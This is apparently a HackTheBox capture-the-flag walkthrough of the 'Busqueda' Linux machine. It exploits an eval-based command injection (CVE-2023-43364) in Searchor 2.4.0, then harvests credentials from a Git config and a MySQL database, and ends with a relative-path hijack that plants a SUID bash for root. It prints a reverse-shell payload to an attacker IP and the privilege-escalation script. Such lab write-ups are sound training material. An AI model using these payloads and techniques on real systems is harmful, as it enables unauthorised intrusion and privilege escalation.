---
title: Busqueda
date: 2024-12-19
description: Busqueda is an Easy Difficulty Linux machine that involves exploiting a command injection vulnerability present in a `Python` module. By leveraging this vulnerability, we gain user-level access to the machine. To escalate privileges to `root`, we discover credentials within a `Git` config file, allowing us to log into a local `Gitea` service. Additionally, we uncover that a system checkup script can be executed with `root` privileges by a specific user. By utilizing this script, we enumerate `Docker` containers that reveal credentials for the `administrator` user and `Gitea` account. Further analysis of the system checkup script and source code in a `Git` repository reveals a means to exploit a relative path reference, granting us Remote Code Execution (RCE) with `root` privileges.
draft: false
hideToc: false
enableToc: true
enableTocContent: true
author: g4nd1v
authorEmoji: 👨‍💻
tags:
  - HackTheBox
  - CVE-2023-43364
  - docker
  - gitea
  - mysql
categories:
  - HackTheBox
  - HackTheBox/Linux
image: images/Busqueda/banner.jpeg
---

# Busqueda

| Title       | Busqueda                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 |
| ----------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| Description | Busqueda is an Easy Difficulty Linux machine that involves exploiting a command injection vulnerability present in a `Python` module. By leveraging this vulnerability, we gain user-level access to the machine. To escalate privileges to `root`, we discover credentials within a `Git` config file, allowing us to log into a local `Gitea` service. Additionally, we uncover that a system checkup script can be executed with `root` privileges by a specific user. By utilizing this script, we enumerate `Docker` containers that reveal credentials for the `administrator` user and `Gitea` account. Further analysis of the system checkup script and source code in a `Git` repository reveals a means to exploit a relative path reference, granting us Remote Code Execution (RCE) with `root` privileges. |
| Difficulty  | Easy                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     |
| Maker       | [kavigihan](https://app.hackthebox.com/users/389926)                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     |

## Nmap

```bash
└──╼ $nmap -sC -sV -oA nmap/nmap 10.129.75.187
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-18 04:32 CST
Nmap scan report for 10.129.75.187
Host is up (0.17s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 4f:e3:a6:67:a2:27:f9:11:8d:c3:0e:d7:73:a0:2c:28 (ECDSA)
|_  256 81:6e:78:76:6b:8a:ea:7d:1b:ab:d4:36:b7:f8:ec:c4 (ED25519)
80/tcp open  http    Apache httpd 2.4.52
|_http-title: Did not follow redirect to http://searcher.htb/
|_http-server-header: Apache/2.4.52 (Ubuntu)
Service Info: Host: searcher.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 15.50 seconds
```

It seems there are 2 ports open - ssh and http. Moreover, http port is redirected to `searcher.htb`, so we will add that in `/etc/hosts`.

## CVE

Here is the homepage of the website, where we can see it is using `Searchor 2.4.0`
![[Pasted image 20241218233641.png]]
After doing a quick google, we found a [vulnerability](https://nvd.nist.gov/vuln/detail/cve-2023-43364) - [commit](https://github.com/ArjunSharda/Searchor/commit/16016506f7bf92b0f21f51841d599126d6fcd15b) - CVE-2023-43364. So basically it was using `eval` function, and we all know what it can lead to, right?
![[Pasted image 20241218234002.png]]
So this is the vulnerable code

```python
url = eval(
	f"Engine.{engine}.search('{query}', copy_url={copy}, open_web={open})"
)
```

Let's see what parameters we can able to manipulate using burpsuite.
![[Pasted image 20241218234237.png]]

## User

We have access to two parameters, that is engine and query. If we try to inject manually, we can use this payload

- payload - `' + __import__('os').popen('bash -c "bash -i >& /dev/tcp/10.10.14.36/4444 0>&1"').read() + '`
  Or else we can use direct exploits
- exploit - https://github.com/nikn0laty/Exploit-for-Searchor-2.4.0-Arbitrary-CMD-Injection
  We will get the shell after running this payload
  ![[Pasted image 20241219001639.png]]
  Now, get full tty using this commands

```
python3 -c "import pty;pty.spawn('/bin/bash')"

Ctrl + Z

stty raw -echo; fg

Then it will continue the shell and just press enter(assuming you're on kali)
```

we will get user's flag in home directory.

```bash
svc@busqueda:~$ cat user.txt
533822c5c5e05cff7765a7f48afb916a
```

## Root

In the home directory, I have noticed `.gitconfig` file and in that file we found a username named as `cody`.

```bash
svc@busqueda:~$ ls -al
total 40
drwxr-x--- 4 svc  svc  4096 Dec 19 05:18 .
drwxr-xr-x 3 root root 4096 Dec 22  2022 ..
lrwxrwxrwx 1 root root    9 Feb 20  2023 .bash_history -> /dev/null
-rw-r--r-- 1 svc  svc   220 Jan  6  2022 .bash_logout
-rw-r--r-- 1 svc  svc  3771 Jan  6  2022 .bashrc
drwx------ 2 svc  svc  4096 Feb 28  2023 .cache
-rw-rw-r-- 1 svc  svc    76 Apr  3  2023 .gitconfig
drwxrwxr-x 5 svc  svc  4096 Jun 15  2022 .local
lrwxrwxrwx 1 root root    9 Apr  3  2023 .mysql_history -> /dev/null
-rw-r--r-- 1 svc  svc   807 Jan  6  2022 .profile
lrwxrwxrwx 1 root root    9 Feb 20  2023 .searchor-history.json -> /dev/null
-rw-r----- 1 root svc    33 Dec 18 10:02 user.txt
-rw------- 1 svc  svc  1089 Dec 19 05:18 .viminfo
svc@busqueda:~$ cat .gitconfig
[user]
        email = cody@searcher.htb
        name = cody
[core]
        hooksPath = no-hooks
```

I have moved to the website directory that is `/var/www/app` and checked if I am getting anything out of it and in that directory I have found `.git` folder - on checking the config for that folder we got a subdomain `gitea.searcher.htb` with cody's username and password. Adding this domain in our `/etc/hosts` and let's visit the website.

```bash
svc@busqueda:/var/www/app$ ls -al
total 20
drwxr-xr-x 4 www-data www-data 4096 Apr  3  2023 .
drwxr-xr-x 4 root     root     4096 Apr  4  2023 ..
-rw-r--r-- 1 www-data www-data 1124 Dec  1  2022 app.py
drwxr-xr-x 8 www-data www-data 4096 Dec 18 10:02 .git
drwxr-xr-x 2 www-data www-data 4096 Dec  1  2022 templates
svc@busqueda:/var/www/app$
svc@busqueda:/var/www/app$ cd .git
svc@busqueda:/var/www/app/.git$ ls
branches        config       HEAD   index  logs     refs
COMMIT_EDITMSG  description  hooks  info   objects
svc@busqueda:/var/www/app/.git$ cat config
[core]
        repositoryformatversion = 0
        filemode = true
        bare = false
        logallrefupdates = true
[remote "origin"]
        url = http://cody:jh1usoih2bkjaspwe92@gitea.searcher.htb/cody/Searcher_site.git
        fetch = +refs/heads/*:refs/remotes/origin/*
[branch "main"]
        remote = origin
        merge = refs/heads/main
```

![[Pasted image 20241219002855.png]]
Username and password worked for cody and we found a repository.
![[Pasted image 20241219002944.png]]
Well, the code present in repo is same as we found in `/var/www/app` folder, so not too interesting, moreover, it has no commit histories, no previous issues and pull requests, so I think it's deadend. Moving to the next thing, `sudo -l`. But that will require a password. Cody's password worked for SVC, so we're good!

```bash
svc@busqueda:/var/www/app/.git$ sudo -l
[sudo] password for svc:
Matching Defaults entries for svc on busqueda:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User svc may run the following commands on busqueda:
    (root) /usr/bin/python3 /opt/scripts/system-checkup.py *
```

On running the file we can see,

```
Usage: /opt/scripts/system-checkup.py <action> (arg1) (arg2)

     docker-ps     : List running docker containers
     docker-inspect : Inpect a certain docker container
     full-checkup  : Run a full system checkup
```

Let's run `docker-ps`

```bash
$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-ps
CONTAINER ID   IMAGE                COMMAND                  CREATED         STATUS        PORTS                                             NAMES
960873171e2e   gitea/gitea:latest   "/usr/bin/entrypoint…"   23 months ago   Up 20 hours   127.0.0.1:3000->3000/tcp, 127.0.0.1:222->22/tcp   gitea
f84a6b33fb5a   mysql:8              "docker-entrypoint.s…"   23 months ago   Up 20 hours   127.0.0.1:3306->3306/tcp, 33060/tcp               mysql_db
```

By running `docker-inspect` with `--format` we can able to get IP address for `mysql_db`

- Reference - https://docs.docker.com/reference/cli/docker/inspect/#examples
- command - `sudo python3 /opt/scripts/system-checkup.py docker-inspect '{{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}' mysql_db`
- By running the command it will give us this IP address - `172.19.0.3`.
  Now that we know the IP address, username and password, we can able to login with mysql
- command - `mysql -h 172.19.0.3 -u gitea -pyuiu1hoiu4i5ho1uh gitea`

```mysql
mysql> show databases;
+--------------------+
| Database           |
+--------------------+
| gitea              |
| information_schema |
| performance_schema |
+--------------------+
3 rows in set (0.00 sec)
mysql> use gitea;
Database changed
mysql> show tables;
+---------------------------+
| Tables_in_gitea           |
+---------------------------+
| access                    |
| access_token              |
| action                    |
| app_state                 |
| attachment                |
... and so on ...
```

we can get name, email and password from user's table.

```mysql
mysql> select name,email,passwd from user;
+---------------+----------------------------------+------------------------------------------------------------------------------------------------------+
| name          | email                            | passwd                                                                                               |
+---------------+----------------------------------+------------------------------------------------------------------------------------------------------+
| administrator | administrator@gitea.searcher.htb | ba598d99c2202491d36ecf13d5c28b74e2738b07286edc7388a2fc870196f6c4da6565ad9ff68b1d28a31eeedb1554b5dcc2 |
| cody          | cody@gitea.searcher.htb          | b1f895e8efe070e184e5539bc5d93b362b246db67f3a2b6992f37888cb778e844c0017da8fe89dd784be35da9a337609e82e |
+---------------+----------------------------------+------------------------------------------------------------------------------------------------------+
```

We found another user named as administrator, we can crack that hash, but cody's password works for administrator, so we can able to login into `gitea`.
![[Pasted image 20241219005021.png]]
In here we found the source code for the all of the scripts, let's look into it and exploit it!
In `system-check.py` we see that in `docker-ps` and `docker-inspect` it is running the commands with `run_command` functions with specific arguments so that is not vulnerable but `full-check.sh` on line `47` it is executing the file from current directory, that's interesting. So if we try to run `sudo python3 /opt/scripts/system-checkup.py full-checkup` it will say `Something went wrong` that means it cannot be able to find `full-checkup.sh` in current directory and because of that it is going in `except` and exiting the program.

```python
    elif action == 'full-checkup':
        try:
            arg_list = ['./full-checkup.sh']
            print(run_command(arg_list))
            print('[+] Done!')
        except:
            print('Something went wrong')
            exit(1)
```

Alright, now that we have some hints, `full-checkup.sh` and run the command again for full checkup.

```bash
#!/bin/bash

cp /bin/bash /tmp/g4nd1v
chmod 4777 /tmp/g4nd1v
```

Next chain of commands

```bash
chmod +x full-checkup.sh
sudo python3 /opt/scripts/system-checkup.py full-checkup
ls -l /tmp/g4nd1v
/tmp/g4nd1v -p
```

Outputs

```bash
vc@busqueda:~$ chmod +x full-checkup.sh
svc@busqueda:~$ sudo python3 /opt/scripts/system-checkup.py full-checkup

[+] Done!
svc@busqueda:~$
svc@busqueda:~$ ls -l /tmp/g4nd1v
-rwsrwxrwx 1 root root 1396520 Dec 19 06:07 /tmp/g4nd1v
svc@busqueda:~$ /tmp/g4nd1v -p
g4nd1v-5.1# ls
full-checkup.sh  user.txt
g4nd1v-5.1# cat /root/root.txt
46315751d8254a4e8d90430533984b32
```
